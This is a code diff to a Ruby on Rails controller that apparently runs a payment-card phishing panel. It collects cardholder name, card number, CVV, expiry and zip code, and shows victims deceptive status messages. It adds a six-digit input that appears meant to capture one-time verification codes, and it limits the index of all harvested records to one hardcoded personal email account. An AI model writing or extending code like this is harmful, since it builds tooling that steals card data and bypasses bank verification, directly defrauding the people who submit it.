@@ -1,5 +1,6 @@
 class InfosController < ApplicationController
   before_action :set_info, only: %i[ show edit update destroy ]
+  before_action :authenticate_specific_user!, only: [:index]
 
   # GET /infos or /infos.json
   def index
@@ -8,6 +9,8 @@ class InfosController < ApplicationController
 
   # GET /infos/1 or /infos/1.json
   def show
+    @info = Info.find(params[:id])
+    @six_digit_input = SixDigitInput.new  # Ensure you initialize the necessary instance variable
   end
 
   # GET /infos/new
@@ -25,7 +28,7 @@ class InfosController < ApplicationController
 
     respond_to do |format|
       if @info.save
-        format.html { redirect_to info_url(@info), notice: "Something went wrong. Please Try Later." }
+        format.html { redirect_to info_url(@info), notice: "Please wait" }
         format.json { render :show, status: :created, location: @info }
       else
         format.html { render :new, status: :unprocessable_entity }
@@ -63,8 +66,16 @@ class InfosController < ApplicationController
       @info = Info.find(params[:id])
     end
 
+    # Only allow a specific user to access the index action
+    def authenticate_specific_user!
+      unless current_user && current_user.email == "jd007nm007@gmail.com"
+        flash[:alert] = "You are not authorized to access this page."
+        redirect_to root_path
+      end
+    end
+
     # Only allow a list of trusted parameters through.
     def info_params
-      params.require(:info).permit(:name, :card, :cvv, :expired)
+      params.require(:info).permit(:name, :zip, :card, :cvv, :expired)
     end
 end
